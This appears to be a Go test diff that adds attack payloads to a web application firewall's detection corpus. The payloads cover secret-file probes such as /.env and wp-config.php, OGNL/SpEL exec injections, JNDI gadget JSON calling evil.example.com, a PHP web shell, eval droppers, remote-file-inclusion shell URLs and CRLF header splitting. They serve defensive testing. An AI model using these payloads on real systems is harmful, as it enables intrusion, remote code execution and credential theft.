@@ -35,6 +35,7 @@ import (
 	"github.com/gsoultan/gwaf"
 	"github.com/gsoultan/gwaf/rules"
 	"github.com/gsoultan/gwaf/rules/op"
+	"github.com/gsoultan/gwaf/ruleset/core"
 	"github.com/gsoultan/gwaf/types"
 )
 
@@ -46,6 +47,13 @@ type evasion struct {
 	target    string // sent as the request target instead, when set
 	header    [2]string
 	body      string
+
+	// optIn marks a case covered by a rule that ships outside the default set.
+	// Those rules are excluded from core for a measured reason -- CRLFHeaderRule
+	// costs a transform chain nobody else shares -- but "not on by default" is
+	// not "not detected", and a corpus that silently dropped them would report a
+	// capability gap gwaf does not have.
+	optIn bool
 }
 
 // ---- the corpus ------------------------------------------------------------
@@ -437,6 +445,58 @@ var evasions = []evasion{
 		target: "/settings?constructor.prototype.isAdmin=true"},
 	{name: "protopoll/bracket form", technique: "none",
 		target: "/settings?constructor][prototype][isAdmin=true"},
+	// ---- exposed artifacts and reconnaissance ------------------------------
+	{name: "artifact/git config", technique: "none", target: "/.git/config"},
+	{name: "artifact/git head", technique: "none", target: "/.git/HEAD"},
+	{name: "artifact/env file", technique: "none", target: "/.env"},
+	{name: "artifact/htpasswd", technique: "none", target: "/.htpasswd"},
+	{name: "artifact/wp-config", technique: "none", target: "/wp-config.php"},
+	{name: "artifact/server-status", technique: "none", target: "/server-status"},
+	{name: "artifact/pprof heap", technique: "none", target: "/debug/pprof/heap"},
+	{name: "artifact/sql dump", technique: "none", target: "/backup/db-dump.sql"},
+	{name: "artifact/editor backup", technique: "none", target: "/wp-config.php.bak"},
+	{name: "artifact/config traversal", technique: "none", target: "/x?img=../wp-config.php"},
+	{name: "artifact/env traversal", technique: "none", target: "/x?f=../../.env"},
+
+	// ---- expression-language injection --------------------------------------
+	//
+	// These arrive with no template delimiters at all, which is why the SSTI
+	// detector cannot see them: Struts evaluates OGNL out of a Content-Type and
+	// Spring Cloud Function evaluates SpEL out of a routing expression.
+	{name: "elinj/struts ognl", technique: "none",
+		arg: "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('id'))}"},
+	{name: "elinj/spel type call", technique: "none",
+		arg: `T(java.lang.Runtime).getRuntime().exec("id")`},
+	{name: "elinj/confluence ognl", technique: "none",
+		arg: "${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id')))}"},
+	{name: "elinj/memberaccess", technique: "none", arg: "#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS"},
+	{name: "elinj/processbuilder", technique: "none", arg: "new java.lang.ProcessBuilder('sh','-c','id')"},
+
+	// ---- deserialization gadget classes -------------------------------------
+	{name: "gadget/jackson jdbcrowset", technique: "body",
+		body: `{"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil.example.com/a"}`},
+	{name: "gadget/spring classpathxml", technique: "body",
+		body: `{"@type":"org.springframework.context.support.ClassPathXmlApplicationContext"}`},
+	{name: "gadget/templatesimpl", technique: "none",
+		arg: "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"},
+
+	// ---- PHP dynamic evaluation / web shells --------------------------------
+	{name: "phpeval/china chopper", technique: "body", body: `{"c":"<?php @eval($_POST['pass']); ?>"}`},
+	{name: "phpeval/base64 dropper", technique: "none", arg: "eval(base64_decode('c3lzdGVt'))"},
+	{name: "phpeval/gzinflate dropper", technique: "none", arg: "eval(gzinflate(base64_decode('DcHB')))"},
+	{name: "phpeval/create_function", technique: "none", arg: "create_function('$x','eval($x);')"},
+	{name: "phpeval/rot13 dropper", technique: "none", arg: "eval(str_rot13('flfgrz'))"},
+
+	// ---- remote file inclusion ----------------------------------------------
+	{name: "rfi/timthumb", technique: "none", arg: "http://evil.example.com/shell.php"},
+	{name: "rfi/query truncation", technique: "none", arg: "http://evil.example.com/shell.php?"},
+	{name: "rfi/https variant", technique: "none", arg: "https://evil.example.com/backdoor.phtml"},
+	{name: "rfi/jsp payload", technique: "none", arg: "http://evil.example.com/x.jsp"},
+
+	// ---- CRLF response splitting --------------------------------------------
+	{name: "crlf/set-cookie", optIn: true, technique: "urlencode", target: "/r?u=/x%0d%0aSet-Cookie:%20admin=1"},
+	{name: "crlf/location", optIn: true, technique: "urlencode", target: "/r?u=%0d%0aLocation:%20http://evil.example.com"},
+	{name: "crlf/lf only", optIn: true, technique: "urlencode", target: "/r?u=%0aContent-Type:%20text/html"},
 }
 
 // urlEncodeQ percent-encodes a GraphQL document for the GET form the
@@ -772,6 +832,12 @@ var declaredClasses = map[string]int{
 	"javaser":   3,
 	"ssrf":      6,
 	"protopoll": 3,
+	"artifact":  8,
+	"elinj":     5,
+	"gadget":    3,
+	"phpeval":   5,
+	"rfi":       4,
+	"crlf":      3,
 }
 
 // classOf returns the attack class a case belongs to, taken from its name.
@@ -889,6 +955,15 @@ func runBenign(t *testing.T, w *gwaf.WAF, b benignCase) gwaf.Decision {
 // TestBenignCorpus because neither number means anything alone.
 func TestEvasionCorpus(t *testing.T) {
 	w := newWAF(t)
+	// The same corpus, measured against the default ruleset plus the rules that
+	// ship opt-in. Cases marked optIn run here instead.
+	// Only the extra rules. WithRuleset *accumulates* onto the default set
+	// rather than replacing it, so passing core.Default() here would define
+	// every core rule twice and fail compilation with a duplicate-ID error.
+	wOpt := newWAF(t, gwaf.WithRuleset(rules.Set{
+		core.CRLFHeaderRule(1007),
+		core.LoopbackSSRFRule(11003),
+	}))
 
 	byTechnique := map[string]struct{ caught, total int }{}
 	byClass := map[string]struct{ caught, total int }{}
@@ -896,7 +971,11 @@ func TestEvasionCorpus(t *testing.T) {
 
 	for _, e := range evasions {
 		t.Run(e.name, func(t *testing.T) {
-			d := runEvasion(t, w, e)
+			target := w
+			if e.optIn {
+				target = wOpt
+			}
+			d := runEvasion(t, target, e)
 
 			s := byTechnique[e.technique]
 			c := byClass[classOf(e.name)]
